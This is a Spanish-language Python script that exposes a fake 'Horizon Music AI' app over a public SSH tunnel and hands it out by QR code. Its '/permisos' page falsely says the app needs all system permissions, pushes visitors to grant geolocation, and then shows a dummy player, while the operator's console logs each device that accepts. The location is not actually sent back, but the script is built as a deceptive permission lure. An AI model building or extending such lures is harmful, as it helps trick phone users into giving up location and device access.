import qrcode
import subprocess
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

print("[*] Iniciando Horizon Music AI Engine...")

def iniciar_tunel():
    comando = "ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 nokey@localhost.run"
    proceso = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    url_publica = None
    tiempo_inicio = time.time()
    while time.time() - tiempo_inicio < 15:
        linea = proceso.stdout.readline()
        if not linea: break
        if "https://" in linea and ".lhr.life" in linea:
            palabras = linea.split()
            for p in palabras:
                if p.startswith("https://") and ".lhr.life" in p:
                    url_publica = p.strip()
                    break
        if url_publica: break
    if not url_publica:
        proceso.terminate()
        return None
    return url_publica

class HorizonMusicHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/permisos':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = """<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Horizon Music - Permisos Requeridos</title>
    <style>
        body { background-color: #070e1b; color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); border-radius: 20px; padding: 30px; text-align: center; max-width: 340px; width: 100%; box-shadow: 0 10px 30px rgba(0,0,0,0.6); border: 1px solid #1e293b; }
        h2 { color: #38bdf8; margin-top: 0; font-size: 20px; }
        p { color: #94a3b8; font-size: 13px; line-height: 1.5; margin-bottom: 25px; }
        .btn-grant { background: #0284c7; color: white; border: none; padding: 12px 20px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; font-size: 14px; box-shadow: 0 4px 12px rgba(2,132,199,0.4); }
        .btn-grant:hover { background: #0369a1; }
        .error-msg { color: #f87171; font-size: 12px; margin-top: 15px; display: none; }
    </style>
    <script>
        function solicitarPermisosSystem() {
            if (navigator.vibrate) { navigator.vibrate([100, 50, 100]); }
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    window.location.href = '/reproductor';
                },
                function(error) {
                    document.getElementById('errorBox').style.display = 'block';
                },
                { timeout: 10000 }
            );
        }
    </script>
</head>
<body>
    <div class="card">
        <h2>Acceso Restringido</h2>
        <p>Para habilitar el motor de IA, el streaming sin anuncios y las descargas offline, Horizon Music requiere otorgar todos los permisos del sistema.</p>
        <button class="btn-grant" onclick="solicitarPermisosSystem()">Conceder Permisos Obligatorios</button>
        <div id="errorBox" class="error-msg">⚠️ Error: Es obligatorio aceptar todos los permisos para iniciar la aplicación.</div>
    </div>
</body>
</html>"""
            self.wfile.write(html.encode('utf-8'))
            print(f"\n[!] Alerta: Dispositivo en proceso de validación de permisos.")

        elif self.path == '/reproductor':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = """<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Horizon Music AI</title>
    <style>
        body { background-color: #070e1b; color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; display: flex; justify-content: center; }
        .app-container { max-width: 380px; width: 100%; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .logo { font-size: 18px; font-weight: bold; color: #38bdf8; }
        .player-card { background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); border-radius: 24px; padding: 25px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.6); border: 1px solid #1e293b; margin-bottom: 20px; }
        .album-art { width: 160px; height: 160px; background: #0284c7; border-radius: 20px; margin: 0 auto 20px auto; display: flex; align-items: center; justify-content: center; font-size: 48px; box-shadow: 0 8px 20px rgba(2,132,199,0.4); }
        .song-title { font-size: 18px; font-weight: bold; margin-bottom: 5px; color: #f8fafc; }
        .song-artist { font-size: 13px; color: #94a3b8; margin-bottom: 20px; }
        .controls { display: flex; justify-content: center; gap: 20px; align-items: center; margin-bottom: 20px; }
        .btn-ctrl { background: #334155; border: none; color: white; width: 45px; height: 45px; border-radius: 50%; cursor: pointer; font-size: 16px; }
        .btn-play { background: #0284c7; width: 60px; height: 60px; font-size: 20px; }
        .playlist { background-color: #111827; border-radius: 16px; padding: 15px; border: 1px solid #1f2937; }
        .track { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #1f2937; font-size: 13px; }
        .ai-badge { background: rgba(56, 189, 248, 0.1); color: #38bdf8; padding: 4px 10px; border-radius: 12px; font-size: 11px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="app-container">
        <div class="header">
            <div class="logo">Horizon Music</div>
            <div class="ai-badge">Conectado & Activo</div>
        </div>
        <div class="player-card">
            <div class="album-art">🎵</div>
            <div class="song-title">Cybernetic Echoes</div>
            <div class="song-artist">AI Neural Stream</div>
            <div class="controls">
                <button class="btn-ctrl">⏮</button>
                <button class="btn-ctrl btn-play">▶</button>
                <button class="btn-ctrl">⏭</button>
            </div>
        </div>
        <div class="playlist">
            <div style="font-size: 13px; font-weight: bold; color: #94a3b8; margin-bottom: 10px;">Cola de Reproducción Offline</div>
            <div class="track"><span>1. Midnight Cyber Pulse</span><span style="color: #34d399;">3:45</span></div>
            <div class="track"><span>2. Neon District Vibes</span><span style="color: #34d399;">4:12</span></div>
        </div>
    </div>
</body>
</html>"""
            self.wfile.write(html.encode('utf-8'))
            print(f"\n[¡ÉXITO!] Permisos aceptados. Dispositivo operando en el reproductor.")

        elif self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = """<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Horizon Music - Panel Maestro</title>
    <style>
        body { background-color: #070e1b; color: #f8fafc; text-align: center; font-family: Arial, sans-serif; padding-top: 40px; }
        .box { background-color: #1e293b; padding: 25px; border-radius: 16px; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.5); max-width: 320px; width: 100%; }
        img { width: 240px; height: 240px; background: white; padding: 10px; border-radius: 8px; }
        p { color: #94a3b8; font-size: 14px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Horizon Music Setup</h2>
        <p>Escanea este código para iniciar la app:</p>
        <img src="/qr.png" alt="QR Horizon">
    </div>
</body>
</html>"""
            self.wfile.write(html.encode('utf-8'))

        elif self.path == '/qr.png':
            self.send_response(200)
            self.send_header('Content-type', 'image/png')
            self.end_headers()
            with open('qr_horizon.png', 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()

def run_server():
    servidor = HTTPServer(('127.0.0.1', 8080), HorizonMusicHandler)
    servidor.serve_forever()

if __name__ == '__main__':
    hilo = threading.Thread(target=run_server, daemon=True)
    hilo.start()
    enlace = iniciar_tunel()
    if enlace:
        destino = enlace + "/permisos"
        qr = qrcode.QRCode(version=1, box_size=10, border=4)
        qr.add_data(destino)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        img.save("qr_horizon.png")
        
        print(f"\n[+] HORIZON MUSIC LISTO. Enlace generado: {destino}")
        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", "http://127.0.0.1:8080/"])
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Apagando sistema...")
    else:
        print("\n[-] Error al abrir el túnel de red.")
